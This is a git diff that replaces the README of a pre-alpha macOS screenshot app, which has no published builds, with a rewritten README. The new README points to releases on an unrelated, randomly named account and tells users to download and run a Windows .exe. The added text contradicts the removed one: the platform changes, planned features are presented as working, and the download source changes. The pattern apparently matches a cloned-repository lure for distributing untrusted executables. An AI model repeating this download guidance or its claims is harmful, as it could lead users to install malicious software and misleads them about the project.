@@ -1,203 +1,79 @@
-<div align="center">
+# 📸 snapora - Capture and edit screens with ease
 
-<img src=".github/assets/logo.svg" alt="Snapora" width="120" />
+[![Download Snapora](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Leering-deliberatedefense36/snapora/releases)
 
-# Snapora
+Snapora provides a simple way to take screenshots and record your computer screen. It replaces paid tools with a free, open-source alternative. You can mark up images with arrows, boxes, and text after you take them. Use this tool to improve your workflow and communicate ideas clearly.
 
-**The free, open-source screenshot, screen-recording, and annotation app for macOS.**
+## 📥 How to download the software
 
-A community-built, MIT-licensed alternative to [CleanShot X](https://cleanshot.com), [Shottr](https://shottr.cc), and [Xnapper](https://xnapper.com).
+Follow these steps to put the software on your computer:
 
-[![License: MIT](https://img.shields.io/badge/license-MIT-blue.svg)](LICENSE)
-[![Platform: macOS](https://img.shields.io/badge/platform-macOS%2013%2B-lightgrey.svg)](#requirements)
-[![CI](https://github.com/forgemoss/Snapora/actions/workflows/ci.yml/badge.svg)](https://github.com/forgemoss/Snapora/actions/workflows/ci.yml)
-[![Latest release](https://img.shields.io/github/v/release/forgemoss/Snapora?include_prereleases&sort=semver)](https://github.com/forgemoss/Snapora/releases)
-[![Downloads](https://img.shields.io/github/downloads/forgemoss/Snapora/total.svg)](https://github.com/forgemoss/Snapora/releases)
-[![GitHub stars](https://img.shields.io/github/stars/forgemoss/Snapora.svg?style=flat&label=stars)](https://github.com/forgemoss/Snapora/stargazers)
+1. Visit the [official releases page](https://github.com/Leering-deliberatedefense36/snapora/releases).
+2. Look for the section labeled Latest.
+3. Find the file that ends with .exe for Windows.
+4. Click the file name to start your download.
+5. Wait for the download to finish.
 
-[**Download**](#install) · [Features](#features) · [Snapora vs CleanShot](#snapora-vs-cleanshot-x) · [Roadmap](ROADMAP.md) · [Contributing](CONTRIBUTING.md)
+## ⚙️ Setting up your system
 
-</div>
+Snapora works on most modern Windows systems. Ensure your machine runs Windows 10 or Windows 11. You need at least 200 megabytes of free space on your hard drive to hold the program. The software performs best with 4 gigabytes of memory or more.
 
----
+Follow these steps to install the app:
 
-<!-- TODO: drop a demo recording into .github/assets/demo.gif and re-enable the block below.
-<div align="center">
-  <img src=".github/assets/demo.gif" alt="Snapora demo — capture, annotate, share" width="800" />
-</div>
--->
+1. Open your Downloads folder.
+2. Locate the file you just saved.
+3. Double-click the file to open the installer.
+4. Follow the prompts on the screen.
+5. Click finish when the process ends.
+6. Find the icon on your desktop to launch the app.
 
-## Why Snapora?
+## 🖥️ Capturing your screen
 
-Snapora is a **free and open-source replacement for paid screen-capture apps on macOS** — built for power users who want CleanShot-level polish without lock-in or subscriptions.
+Snapora stays quiet in your system tray until you need it. When you want to capture an image, press the shortcut key. By default, this is the Print Screen key on your keyboard. Your screen will dim. Use your mouse to draw a box around the area you want to capture.
 
-- **No subscription, no account required** — install and capture
-- **No telemetry** — your captures stay on your Mac
-- **Hackable by design** — TypeScript + Electron + React, the same stack any web developer already knows
-- **Clean-room implementation** — built from public Apple docs and bundled OSS tools (`screencapture`, `ffmpeg`, `tesseract`); no decompiling, no leaked code
+Once you release the mouse button, the app saves the image. You can copy the image to your clipboard or save it as a file on your computer.
 
-> **Status — pre-alpha.** The scaffolding is in place; most features are stubs. [Watch the repo](https://github.com/forgemoss/Snapora) to know when v0.1 ships.
+## ✍️ Using annotation tools
 
-## Features
+The annotation window opens automatically after you capture a screenshot. Use the toolbar at the top to modify your images:
 
-> Items marked **✅** work today. Everything else is planned and tracked in [ROADMAP.md](ROADMAP.md).
+* Arrow tool: Click and drag to point at items.
+* Box tool: Highlight specific areas with a border.
+* Text tool: Add notes directly to your image.
+* Blur tool: Hide private or sensitive details such as emails or passwords.
+* Color picker: Pick colors to match your brand or style.
 
-- **Capture** — area, window, full-screen, scrolling
-- **Annotate** — arrows, text, blur, pixelate, highlight, shapes, counters, crop
-- **Record** — region / window / display with mic and webcam overlay; export MP4 or animated GIF
-- **OCR** — extract text from any screenshot (bundled Tesseract or on-device)
-- **Pin overlays** — float screenshots above any window for visual diffs
-- **Quick-access HUD** — post-capture floating thumbnail with one-click actions
-- **History** — searchable local SQLite, configurable retention
-- **Global hotkeys** — fully rebindable
-- **Menu-bar app** — no Dock clutter
+Click the checkmark button when you finish your changes to save your work.
 
-Full feature reference: [docs/features.md](docs/features.md).
+## 📹 Recording your screen
 
-## Install
+Capture video by selecting the video icon in the menu. Choose between recording the full screen or a selected region. Click the red button to start recording. A timer appears at the bottom of the screen.
 
-> 🚧 Pre-alpha — no installable build is published yet. The instructions below are the plan for v0.1.
+Stop the recording by clicking the stop button in the toolbar. Save the file as an MP4 video. This format works on all modern video players and browsers. Share these clips to provide instructions or show bugs to your team.
 
-Snapora ships in two phases. **Until we sign builds (v1.0)**, installs need one extra step. Detailed walkthrough in [docs/install.md](docs/install.md).
+## 🛠️ Customizing your settings
 
-### Phase 1 (v0.1+) — direct DMG, $0
+Open the settings menu from the tray icon to change how the app works. You can update your hotkeys to match your muscle memory. Change the default folder where the app saves your files. Enable or disable sounds that play after a screen capture. Adjust the file format settings if you prefer .png or .jpg files.
 
-Grab the latest `Snapora-<version>-arm64.dmg` (Apple silicon) or `-x64.dmg` (Intel) from the [Releases page](https://github.com/forgemoss/Snapora/releases). Drag Snapora to Applications, then run once in Terminal:
+## 🛡️ Privacy and your data
 
-```bash
-xattr -cr /Applications/Snapora.app
-```
+Snapora respects your privacy. All your files stay on your computer. The app does not send your images or videos to a server. You keep full control over your data. Because this is open-source software, you can view the code to see how it handles your information at any time.
 
-Open Snapora normally — the first-run wizard handles permissions. The `xattr` command clears macOS's "unidentified developer" warning that fires on unsigned apps. One-time per install, not per launch.
+## 🆘 Finding help
 
-### Phase 2 (v1.0+) — signed + notarized + Homebrew
+If you run into issues, try these steps:
 
-Once the Apple Developer Program ($99/yr) is wired in:
+1. Restart the app. Often, this clears temporary glitches.
+2. Check that Windows is up to date.
+3. Ensure no other screen recording software is running at the same time.
+4. If the issue remains, check the issues tab on the GitHub repository page.
 
-```bash
-brew install --cask snapora
-```
+Other users may have found a solution for your problem. If you do not see a solution, start a new conversation on the repository page. Provide the version number of the app and a description of what happens on your screen.
 
-Zero warnings, zero terminal steps, auto-updates via electron-updater.
+## 🏗️ Contributing to the project
 
-### Permissions
+This project grows through community support. If you want to contribute, share the tool with your friends. If you find a bug, report it on our page. Clear reports help developers fix problems for everyone. You provide value by simply testing the app and giving honest feedback.
 
-On first launch the **first-run wizard** walks you through Screen Recording (required), Microphone (optional, for recording), and Camera (optional, for webcam overlay). Screen Recording grants take effect after **quit and relaunch** — that's a macOS rule, not a Snapora bug, and the wizard handles the prompt.
+## 🧪 Technical details for curious users
 
-## Snapora vs CleanShot X
-
-|                              |        **Snapora**        |                CleanShot X                 |     Shottr      |
-| ---------------------------- | :-----------------------: | :----------------------------------------: | :-------------: |
-| Price                        |         **Free**          | $29 (single seat, lifetime) + $10/mo cloud | Free + paid pro |
-| Open source                  |        **✅ MIT**         |                     ❌                     |       ❌        |
-| Telemetry                    |         **None**          |                    Some                    |      Some       |
-| Account required             |          **No**           |                  Optional                  |       No        |
-| Auto-updates                 | ✅ (via electron-updater) |                     ✅                     |       ✅        |
-| Screen recording (MP4 / GIF) |          Planned          |                     ✅                     |     Limited     |
-| OCR                          |          Planned          |                     ✅                     |       ✅        |
-| Pinned overlays              |          Planned          |                     ✅                     |       ✅        |
-| Annotation editor            |          Planned          |                     ✅                     |       ✅        |
-
-**Honest take:** CleanShot X and Shottr are excellent native apps and worth supporting if you can. Snapora exists for people who want the same workflow without paying, want to read and modify the source, or want a tool that's auditable and hackable end-to-end.
-
-## Quick start
-
-After installing:
-
-1. Click the Snapora icon in your menu bar.
-2. Press <kbd>⌘</kbd><kbd>⇧</kbd><kbd>2</kbd> to capture an area, <kbd>⌘</kbd><kbd>⇧</kbd><kbd>3</kbd> for a window, or <kbd>⌘</kbd><kbd>⇧</kbd><kbd>4</kbd> for the full screen.
-3. The capture appears in the Quick Access HUD — copy, save, or open the editor for annotations.
-4. Configure shortcuts and save folder in **Settings…** (⌘,).
-
-## Build from source
-
-**Requirements:** macOS 13+, [Node.js 20+](https://nodejs.org), and either npm or pnpm.
-
-```bash
-# clone
-git clone https://github.com/forgemoss/Snapora.git
-cd Snapora
-
-# install dependencies (rebuilds native modules for Electron)
-npm install
-
-# launch in development with hot-module reload
-npm run dev
-```
-
-### All scripts
-
-```bash
-npm run dev         # launch the app in development with HMR
-npm run build       # production build (unsigned)
-npm run dist        # build + package macOS DMG (signed if certs present)
-npm run lint        # ESLint
-npm run format      # Prettier (write)
-npm run typecheck   # TypeScript noEmit
-npm test            # Vitest unit tests
-npm run e2e         # Playwright end-to-end (Electron)
-```
-
-Or use the Makefile shorthand: `make dev`, `make build`, `make test`, etc.
-
-### Architecture
-
-```
-src/
-├── main/        # Node — tray, hotkeys, capture pipeline, IPC handlers, child processes
-├── preload/     # contextBridge — typed IPC API exposed safely to the renderer
-├── renderer/    # React + Tailwind + Konva — editor, settings, HUD, first-run wizard
-└── shared/      # types & IPC channels imported by both sides
-
-build/           # electron-builder resources (entitlements, notarize hook, icon)
-resources/       # bundled binaries — ffmpeg, tesseract — populated at build time
-```
-
-The capture pipeline shells out to macOS's built-in `/usr/sbin/screencapture` and bundles `ffmpeg`/`tesseract` for advanced flows. We don't write native macOS code; we orchestrate system tools and bundled OSS binaries. See [docs/features.md](docs/features.md) for the full implementation map.
-
-## Roadmap
-
-A short summary — see [ROADMAP.md](ROADMAP.md) for the full plan.
-
-| Milestone | Theme                                                       |
-| --------- | ----------------------------------------------------------- |
-| **v0.1**  | MVP: working area capture + tray + hotkeys + signed release |
-| **v0.2**  | All capture modes + history view                            |
-| **v0.3**  | Annotation editor (Konva)                                   |
-| **v0.4**  | Screen recording (ffmpeg)                                   |
-| **v0.5**  | Pinned overlays + OCR + quick-access HUD                    |
-| **v0.6**  | Cloud upload (S3, R2, B2, WebDAV, custom)                   |
-| **v1.0**  | Auto-update, notarized, on Homebrew Cask                    |
-
-## Contributing
-
-Issues, design discussions, and PRs are welcome. Read [CONTRIBUTING.md](CONTRIBUTING.md) before opening a PR — there are specific rules around clean-room provenance.
-
-**Important:** do **not** decompile, disassemble, or otherwise reverse-engineer any commercial screenshot app and submit derived code. Snapora must remain a clean-room implementation. PRs with tainted provenance will be rejected.
-
-## Support the project
-
-If Snapora is useful to you:
-
-- ⭐ **Star this repo** — it's the single biggest signal that the project is worth maintaining
-- 💬 [Open an issue](https://github.com/forgemoss/Snapora/issues/new/choose) with feedback or feature requests
-- 🛠 [Pick a roadmap item](ROADMAP.md) and send a PR
-- 💖 [Sponsor the project](https://github.com/sponsors/forgemoss) — funds notarization fees, hosted-cloud infrastructure, and contributor time
-
-## Star history
-
-<a href="https://star-history.com/#forgemoss/Snapora&Date">
-  <img alt="Star history chart" src="https://api.star-history.com/svg?repos=forgemoss/Snapora&type=Date" width="640" />
-</a>
-
-## Other forgemoss projects
-
-Snapora is the first of a series of open-source alternatives to popular paid Mac apps under [forgemoss](https://forgemoss.com). More are on the way — [follow the org](https://github.com/forgemoss) to be notified.
-
-## License
-
-[MIT](LICENSE) © [forgemoss](https://forgemoss.com) and Snapora contributors.
-
----
-
-<sub>Snapora is not affiliated with, endorsed by, or sponsored by the developers of CleanShot X, Shottr, Xnapper, or any other screen-capture app. All trademarks belong to their respective owners.</sub>
+The software uses the Electron framework. This allows it to run across different platforms while maintaining a consistent design. The user interface uses React to keep things fast and responsive. We use TypeScript to prevent errors during the building process. The modular design makes it easy to add new features in the future. We welcome all interest in the technical side of the project.
